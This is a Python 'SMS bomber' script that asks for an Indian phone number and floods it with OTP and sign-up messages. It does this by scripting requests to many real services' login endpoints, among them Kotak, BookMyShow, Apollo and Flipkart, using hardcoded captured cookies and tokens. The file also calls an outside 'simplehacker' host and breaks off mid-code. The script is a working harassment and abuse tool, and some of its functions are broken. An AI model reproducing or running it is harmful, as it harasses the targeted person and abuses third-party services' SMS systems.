#!/usr/bin/env python
# coding: utf-8

# In[9]:


# scripted by samay
# email thread 
# sms bomb script 
# 2021 


#--------imports 
import os
import sys
try:
    import colorama
    import requests

except ImportError:
    try:
        _ = os.system('pip install colorama' if os.name=='nt' else 'pip3 install colorama')
        _ = os.system('pip install requests' if os.name=='nt' else 'pip3 install requests')
    except:
        pass
import requests
from time import sleep
from colorama import Fore


#------------------------

#---------colors
r = "\\033[1;31m"
g = "\\033[1;32m"
y = "\\033[1;33m"
b = "\\033[1;34m"
d = "\\033[2;37m"
R = "\\033[1;41m"
Y = "\\033[1;43m"
B = "\\033[1;44m"
w = "\\033[1;37m"
g = "\\033[0;90m"
y = r

#--------functions and programs 

logo = '''
    \\033[1;31m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97        \\033[1;35m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97
    \\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91        \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91
    \\033[0;90m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\\033[1;33m    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\033[1;33m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91
    \\033[1;33m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \\033[1;34m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91
    \\033[1;35m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91           \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91
    \\033[1;31m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d           \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d    \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d
'''

def banner():
    print(logo)

def _under_():
    print('\
')

def bye():
    os.system('cls' if os.name=='nt' else 'clear')
    banner()
    string = """ 
    \\033[1;37mDeveloper  \\033[1;34m: \\033[1;31mSamay
    \\033[1;37mGithub     \\033[1;34m: \\033[1;31mSamay825 
    \\033[1;37mInstagram  \\033[1;34m: \\033[1;31m@sincryptzork 
    """
    for letter in string:
        sleep(0.01) 
        sys.stdout.write(letter)
        sys.stdout.flush()
    print("\
")

def clear():
    _ = os.system('cls' if os.name=='nt' else 'clear')
    
def chutmarike(datasl):
    print(r+"\xe2\x94\x94\xe2\x94\x80> "+w+"\\033[1;37m"+datasl)

def front_interfere_look():
    clear()
    banner()
    bye()
    chutmarike('[ 1 ] Blackhat x Sms :')
    chutmarike('[ 2 ] Blackhat x Custom Sms :')
    chutmarike('[ 3 ] Blackhat x Call')
    chutmarike('[ 4 ] Blackhat x Update :')
    chutmarike('[ 5 ] Blackhat x Exit')
    _under_()
    
#-------------------v

os.system('whoami > samay.txt')

with open('samay.txt','r') as file:
    data = file.read()



def _cls_front_under():
    clear()
    banner()
    _under_()

_cls_front_under()
    
#---------------object oriented programming 


class Samay:
    def __init__(self,_user_com,_user2):
        self.data = _user_com
        self.data2 = _user2
    def Passwordencrypt(self):
        if self.data=='prosamay1234' and self.data2=='prosamay9423' or self.data=='lilvaimpier' and self.data2=='lilvaimpierpro' or self.data=='farhaanpro' and self.data2=='farhaanpro1234' or self.data=='aayushpro' and self.data2=='aayushpro1234' or self.data=='vikas' and self.data2=='vikaspro':
            front_interfere_look()
            try:
                ops_under = int(input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Desire option : "+r))
            except:
                _under_()
                chutmarike('Please Write the number to select option ..')
                _under_()
                sys.exit()
            aayush = Mainscript(ops_under)
            aayush.scripting()
        else:
            chutmarike('Wrong Password please Wait ..')
            sleep(2.0)
            _cls_front_under()
            ok = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the username : "+r)
            ok1 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the password : "+r)
            sl = Samay(ok,ok1)
            sl.Passwordencrypt()
class Mainscript:
    def __init__(self,_sek_inp):
        self.data_main = _sek_inp
    def scripting(self):
        if self.data_main==1:
            _cls_front_under()
            number = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r).strip()
            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number+r)

            def aakashin():
                #
                headers533 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Referer': 'https://www.aakash.ac.in/',
                    # Already added when you pass json=
                    # 'content-type': 'application/json',
                    'Origin': 'https://www.aakash.ac.in',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                json_data533 = {
                    'action': 'generate',
                    'phone': number,
                    'access': 'signup',
                }

                response533 = requests.post('https://session-service.aakash.ac.in/prod/sess/api/v1/user/phone/otp/', headers=headers533, json=json_data533)
                

            def jio():
                requests.get(f'https://www.jiomart.com/mst/rest/v1/id/details/{number}')

            def bookmylauda():
                url23 = 'https://in.bookmyshow.com/explore/home/national-capital-region-ncr'

                bmsid = requests.get(url23).cookies['bmsId']
                rgnsi = requests.get(url23).cookies['rgn']

                cookies934 = {
                    'bmsId': bmsid,
                    'preferences': '%7B%22ticketType%22%3A%22M-TICKET%22%7D',
                    'rgn': rgnsi,
                    'G_ENABLED_IDPS': 'google',
                    '__cfruid': 'e5af2b7583cd51cdd6cfc279a206c1e2d473f89b-1662927293',
                }

                headers934 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': 'application/json',
                    'Accept-Language': 'en-US,en;q=0.5',
                    # Already added when you pass json=
                    # 'Content-Type': 'application/json',
                    'Origin': 'https://in.bookmyshow.com',
                    'DNT': '1',
                    'Alt-Used': 'in.bookmyshow.com',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'Referer': 'https://in.bookmyshow.com/explore/home/national-capital-region-ncr',
                    'Connection': 'keep-alive',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'bmsId=1.534074422.1661853985123; preferences=%7B%22ticketType%22%3A%22M-TICKET%22%7D; rgn=%7B%22Lat%22%3A%2228.6139%22%2C%22Seq%22%3A%222.0%22%2C%22Long%22%3A%2277.209%22%2C%22regionName%22%3A%22Delhi-NCR%22%2C%22regionCode%22%3A%22NCR%22%2C%22isOlaEnabled%22%3A%22N%22%2C%22regionCodeSlug%22%3A%22ncr%22%2C%22regionNameSlug%22%3A%22national-capital-region-ncr%22%7D; G_ENABLED_IDPS=google; __cfruid=e5af2b7583cd51cdd6cfc279a206c1e2d473f89b-1662927293',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                json_data934 = {
                    'channel': 'phone',
                    'subChannel': 'sms',
                    'details': {
                        'phone': number,
                        'origin': 'https://in.bookmyshow.com',
                    },
                }



                response934 = requests.post('https://in.bookmyshow.com/pwa/api/uapi/otp/send', cookies=cookies934, headers=headers934, json=json_data934)



            def kotakbank():
                #
                url088 = 'https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/ahome2.action?source=811NewMicroSite&banner=NewMicrosite&pubild=Createanaccount'


                gxx = requests.get(url088).cookies['JSESSIONID']
                gxz = requests.get(url088).cookies['KB15499d7e']
                ksxx = requests.get(url088).cookies['NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0']




                cookies654 = {
                    'JSESSIONID': gxx,
                    'NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0': ksxx,
                    'KB15499d7e': gxz,
                    'KB8a0c9ae7431': '08dd64c758ab2000fc1343117ed10635874832c93138704dd0b9ce4ee34e4a6fd92d0866b59db519082fea408a113000c9ac55a1318104ffb69fa0ac5b25221c24fd50031e8e559c0fb3316f8be3d9040604efe27262c2b39ac5b460f9d3cde8',
                }

                headers654 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'X-Requested-With': 'XMLHttpRequest',
                    'Origin': 'https://www.kotak.com',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Referer': 'https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/ahome2.action?source=811NewMicroSite&banner=NewMicrosite&pubild=Createanaccount',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'JSESSIONID=0000D9jwOnOVVIUWe7o1nkGpalH:-1; NSC_JO0ork0tdyr4qd4blzcfyrcuwai1eb0=ffffffff09023da345525d5f4f58455e445a4a42150c; KB15499d7e=152d7b9fc681677d75233eae1ec5833fb0e38fbc69c5ca483fada767f33a2de8ac2474862d3489a1e7c977b77cb94caddd0913fe11cdc22cfd0f64fbca77d8266382e4bf2d3dfe3620a1edd7bd5203fe08cf928266; KB8a0c9ae7431=08dd64c758ab2000fc1343117ed10635874832c93138704dd0b9ce4ee34e4a6fd92d0866b59db519082fea408a113000c9ac55a1318104ffb69fa0ac5b25221c24fd50031e8e559c0fb3316f8be3d9040604efe27262c2b39ac5b460f9d3cde8',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                }

                params654 = {
                    'source': '811NewMicroSite',
                    'banner': 'NewMicrosite',
                    'pubild': 'Createanaccount',
                    'SWNToken': '1661849333037',
                }



                data654 = {
                    'cust_full_name': 'okswani narayan',
                    'cust_email': 'samaioseal@gmail.com',
                    'cust_mobile': f'+91{number}',
                    'cust_political_disclaimer': 'Yes',
                    'cust_fatca_disclaimer': 'Yes',
                }


                response654 = requests.post('https://www.kotak.com/811-savingsaccount-ZeroBalanceAccount/811/save-home.action', params=params654, cookies=cookies654, headers=headers654, data=data654)



            def currybhai():


                skooo = requests.get('https://madamcurry.in/order-online/').cookies['oo.cid']
                cookies = {
                    'AWSALB': '1d69hebwrjaIkBF3yv3xODw0/RmC/dQcbmD9vswN6QBFXZsyYxDpO3a9DTfWjHMdR8zBByx5k9ysImkRQkknJa87EPHW+wc2x1onOr6EkL9B0nkl/2TeG1CpMTvI',
                    'AWSALBCORS': '1d69hebwrjaIkBF3yv3xODw0/RmC/dQcbmD9vswN6QBFXZsyYxDpO3a9DTfWjHMdR8zBByx5k9ysImkRQkknJa87EPHW+wc2x1onOr6EkL9B0nkl/2TeG1CpMTvI',
                    'PHPSESSID': 'mncmtkvr75timpin3s8nkck3d2',
                    'oo.cid': skooo,
                }

                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/json;charset=utf-8',
                    'Origin': 'https://madamcurry.in',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Referer': 'https://madamcurry.in/order-online/',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'AWSALB=1d69hebwrjaIkBF3yv3xODw0/RmC/dQcbmD9vswN6QBFXZsyYxDpO3a9DTfWjHMdR8zBByx5k9ysImkRQkknJa87EPHW+wc2x1onOr6EkL9B0nkl/2TeG1CpMTvI; AWSALBCORS=1d69hebwrjaIkBF3yv3xODw0/RmC/dQcbmD9vswN6QBFXZsyYxDpO3a9DTfWjHMdR8zBByx5k9ysImkRQkknJa87EPHW+wc2x1onOr6EkL9B0nkl/2TeG1CpMTvI; PHPSESSID=mncmtkvr75timpin3s8nkck3d2; oo.cid=s%3AaC5cuN735_90HQJbf8sFLWX_BOyh5B29.HV3lt%2FZM8a7tC4ss3bZ1Yr8IlyaU6A3XAnmaPYHr3lQ',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                }

                json_data = {
                    'userName': number,
                    'otpPurpose': 'VERIFY_REGISTERATION',
                    'onCall': False,
                    'isEmailPrimary': False,
                    'userDetails': {
                        'primaryEmail': 'sehrat@gmail.com',
                        'primaryMobile': number,
                        'countryCode': '+91',
                        'fullName': 'sehrati',
                        'isRegistered': False,
                    },
                    'skipPrimaryCheck': False,
                    'isNewUser': True,
                }

                response = requests.post('https://madamcurry.in/order-online/api/users/sendOtpToPrimary', cookies=cookies, headers=headers, json=json_data)


            def hosing():
                cookies679 = {
                    'userCity': 'eec306948307d1a640ac',
                    'cityUrl': 'pune',
                    'service': 'buy',
                    'category': 'residential',
                    'subCategory': '',
                    'ssrExperiments': 'Commercial_SERP_Desktop_Design_AB%3Dfalse%3Bhpv3%3Dfalse%3Bsort_filter_exp%3Dvar1%3Bserp_feedback_cta_v1%3Dfalse%3Bedge_hp_resale_pricing_ssr%3DvariantA%3Bfad_desktop%3Ddesign_2%3Bnp_verified%3Dfalse%3Bkhoj_rent_filterapi%3Dfalse',
                    'experiments': 'remove_name_email%3Dtrue%3Bview_similar_properties%3Dgallery%3Bavm_arm_v2%3Dtrue%3Brequest_property_tour%3Dfalse%3Bnearby_societies%3Dfalse%3Beliminate_whatsapp_cta%3Dtrue%3Bvisit_together_exp%3Dfalse',
                    '_psid': '1',
                    'traffic': 'sourcemedium%3Dgoogle%20%2F%20organic%3B',
                    'is_return_user': 'false',
                    'is_return_session': 'false',
                    'tvc_sm_fc_new': 'google%7Corganic',
                    'tvc_sm_lc': 'google%7Corganic',
                    '_uuid': '8fdce2fd8db3488257dbd6efd062c877',
                    'request_method': 'POST',
                }

                headers679 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Referer': 'https://housing.com/',
                    'phoenix-api-name': 'LOGIN_SEND_OTP_API',
                    'app-name': 'desktop_web_buyer',
                    'content-type': 'application/json; charset=UTF-8',
                    'Origin': 'https://housing.com',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'userCity=eec306948307d1a640ac; cityUrl=pune; service=buy; category=residential; subCategory=; ssrExperiments=Commercial_SERP_Desktop_Design_AB%3Dfalse%3Bhpv3%3Dfalse%3Bsort_filter_exp%3Dvar1%3Bserp_feedback_cta_v1%3Dfalse%3Bedge_hp_resale_pricing_ssr%3DvariantA%3Bfad_desktop%3Ddesign_2%3Bnp_verified%3Dfalse%3Bkhoj_rent_filterapi%3Dfalse; experiments=remove_name_email%3Dtrue%3Bview_similar_properties%3Dgallery%3Bavm_arm_v2%3Dtrue%3Brequest_property_tour%3Dfalse%3Bnearby_societies%3Dfalse%3Beliminate_whatsapp_cta%3Dtrue%3Bvisit_together_exp%3Dfalse; _psid=1; traffic=sourcemedium%3Dgoogle%20%2F%20organic%3B; is_return_user=false; is_return_session=false; tvc_sm_fc_new=google%7Corganic; tvc_sm_lc=google%7Corganic; _uuid=8fdce2fd8db3488257dbd6efd062c877; request_method=POST',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                params679 = {
                    'apiName': 'LOGIN_SEND_OTP_API',
                    'isBot': 'false',
                    'source': 'web',
                }

                json_data679 = {
                    'query': '\
  mutation($email: String, $phone: String, $otpLength: Int) {\
    sendOtp(phone: $phone, email: $email, otpLength: $otpLength) {\
      success\
      message\
    }\
  }\
',
                    'variables': {
                        'phone': number,
                    },
                }

                response679 = requests.post('https://mightyzeus.housing.com/api/gql', params=params679, cookies=cookies679, headers=headers679, json=json_data679)




            def dunzo():
                #
                url459 = 'https://www.dunzo.com/pune'

                dzer = requests.get(url459).cookies['dz_e']
                connectsid = requests.get(url459).cookies['connect.sid']



                cookies232 = {
                    'dz_e': dzer,
                    'connect.sid': connectsid,
                }

                headers232 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Content-Type': 'application/json;charset=utf-8',
                    'X-APP-TYPE': 'PWA_WEB',
                    'X-APP-VERSION': '2.0.0',
                    'x-csrf-token': 'Kw1fzl0F-EwWo0SWq804pgF7uTZzWfmdI5EI',
                    'correlation-id': '4ab8af80320b11edba39854730921313',
                    'Origin': 'https://www.dunzo.com',
                    'DNT': '1',
                    'Alt-Used': 'www.dunzo.com',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'Referer': 'https://www.dunzo.com/pune',
                    'Connection': 'keep-alive',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'dz_e=NWRhMGNhODgtMTIxNy00NzhlLTgwYmQtZTdjNGU1MzZhN2E4X3Yx; connect.sid=s%3AYSj3CW6xFGodlifTu4oGJK0N_skqXvoV.n%2ByFUBmHV8jmMItQ0siIp4EigKulrvp%2B%2BYWN28dScPU',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                json_data232 = {
                    'phone': number,
                    'tos_accepted': True,
                }



                response232 = requests.post('https://www.dunzo.com/api/v0/auth/sign-up', cookies=cookies, headers=headers, json=json_data)



            def trell():

                headers9978 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Referer': 'https://shop.trell.co/',
                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'Origin': 'https://shop.trell.co',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                }

                data9978 = {
                    'phoneNo': number,
                    'channel': 'sms',
                    'website': 'shop.trell.co',
                    'platform': 'web',
                }


                response9978 = requests.post('https://go-users-stage.trell.co/api/v2/auth/phone', headers=headers9978, data=data9978)
                #

            

            def moglix():
                cookies922 = {
                    'AMCV_1CEE09F45D761AFF0A495E2D%40AdobeOrg': '1075005958%7CMCIDTS%7C19235%7CMCMID%7C55691943638000510581611364707498664906%7CMCOPTOUT-1661852587s%7CNONE%7CvVersion%7C4.4.1',
                    'AMCVS_1CEE09F45D761AFF0A495E2D%40AdobeOrg': '1',
                    'user_sid': 's%3AYjSTH9cKnb3Zi7g5ZGUmaSz9JVPVvBzD.bl9ljQG8Cql%2FNJdHR8%2Bf2JNGDz5%2Bg22mNtqCxj30xQA',
                }

                headers922 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    # Already added when you pass json=
                    # 'Content-Type': 'application/json',
                    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE',
                    'x-access-token': 'fdf581372f273f8973ab5d1daa93eba7',
                    'x-request-id': 'YjSTH9cKnb3Zi7g5ZGUmaSz9JVPVvBzD',
                    'Origin': 'https://www.moglix.com',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'AMCV_1CEE09F45D761AFF0A495E2D%40AdobeOrg=1075005958%7CMCIDTS%7C19235%7CMCMID%7C55691943638000510581611364707498664906%7CMCOPTOUT-1661852587s%7CNONE%7CvVersion%7C4.4.1; AMCVS_1CEE09F45D761AFF0A495E2D%40AdobeOrg=1; user_sid=s%3AYjSTH9cKnb3Zi7g5ZGUmaSz9JVPVvBzD.bl9ljQG8Cql%2FNJdHR8%2Bf2JNGDz5%2Bg22mNtqCxj30xQA',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                json_data922 = {
                    'email': '',
                    'phone': number,
                    'type': 'p',
                    'source': 'signup',
                    'device': 'desktop',
                }



                response922 = requests.post('https://apinew.moglix.com/nodeApi/v1/login/sendOTP', cookies=cookies922, headers=headers922, json=json_data922)


            def mycircle():
                url777 = 'https://www.my11circle.com'

                s = requests.get(url777).cookies['SSID']#['NA_VISITOR']
                k = requests.get(url777).cookies['NA_VISITOR']


                cookies777 = {
                    'sameSiteNoneSupported': 'true',
                    'device.info.cookie': '{"bv":"91.0","bn":"Firefox","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}',
                    'NA_VISITOR': k,
                    'SSID': s,
                    'ga24x7_pixeltracker': 'from_page%3Dlogin.html%26referrer_url%3Dhttps%253A%252F%252Fwww.my11circle.com%252F',
                }

                headers777 = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
                    'Accept': '*/*',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Referer': 'https://www.my11circle.com/player/login.html',
                    # Already added when you pass json=
                    # 'Content-Type': 'application/json',
                    'Origin': 'https://www.my11circle.com',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    # Requests sorts cookies= alphabetically
                    # 'Cookie': 'sameSiteNoneSupported=true; device.info.cookie={"bv":"91.0","bn":"Firefox","osv":"10","osn":"Windows","tbl":"false","vnd":"false","mdl":"false"}; NA_VISITOR=2aded889-024c-4894-a8dd-0eba93e44b2a; SSID=SSID925230af-9877-478c-a60e-6db22a916109; ga24x7_pixeltracker=from_page%3Dlogin.html%26referrer_url%3Dhttps%253A%252F%252Fwww.my11circle.com%252F',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    # Requests doesn't support trailers
                    # 'TE': 'trailers',
                }

                json_data777 = {
                    'mobile': number,
                    'deviceId': '037ab70c-c70b-427c-ac39-1a7871c0e872',
                    'deviceName': '',
                    'refCode': '',
                    'isPlaycircle': False,
                }

                response777 = requests.post('https://www.my11circle.com/api/fl/auth/v3/getOtp', cookies=cookies777, headers=headers777, json=json_data777)
            
            def simplehacker():
                url877 = f'https://simplehacker.pythonanywhere.com/sms/{number}'
                ousimple = requests.get(url877)
            
            def medbuzz():
                headers455 = {
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    'Connection': 'keep-alive',
                    # Already added when you pass json=
                    # 'Content-Type': 'application/json',
                    'DNT': '1',
                    'Origin': 'https://www.medbuzz.in',
                    'Referer': 'https://www.medbuzz.in/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
                }

                json_data455 = {
                    'CountryCode': '+91',
                    'PhoneNumber': number,
                    'ApiKey': 'fbfc0125-fea6-4ab0-a919-fb01785c1457',
                    'USERID': '',
                    'SessionID': '',
                }
                response455 = requests.post('https://api.medbuzz.in/app/Generate_User_OTP', headers=headers455, json=json_data455)

            def apollo():
                headers555 = {
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,eo;q=0.6,tr;q=0.5',
                    'Connection': 'keep-alive',
                    'DNT': '1',
                    'Origin': 'https://www.apollopharmacy.in',
                    'Referer': 'https://www.apollopharmacy.in/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'cross-site',
                    'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
                    'accept': '*/*',
                    'authorization': 'Bearer 3d1833da7020e0602165529446587434',
                    # Already added when you pass json=
                    # 'content-type': 'application/json',
                }

                json_data555 = {
                    'operationName': 'Login',
                    'variables': {
                        'mobileNumber': f'+91{number}',
                        'loginType': 'PATIENT',
                    },
                    'query': 'query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\
  login(mobileNumber: $mobileNumber, loginType: $loginType) {\
    status\
    message\
    loginId\
    __typename\
  }\
}\
',
                }

                response555 = requests.post('https://webapi.apollo247.com/', headers=headers555, json=json_data555)

            def flipkart():
                cookies11 = {
                    'T': 'TI166051777263500361725355184726229621803065293637887642574388860456',
                    'SN': 'VI9F4398DB200245EFB45DDABB60763A5F.TOKE8F2773347064BEA8B89703E6443BE39.1660517772.LO',
                    'AMCV_17EB401053DAF4840A490D4C%40AdobeOrg': '-227196251%7CMCIDTS%7C19219%7CMCMID%7C07813909948777340084014996032482903537%7CMCAID%7CNONE%7CMCOPTOUT-1660524980s%7CNONE',
                    'gpv_pn': 'HomePage',
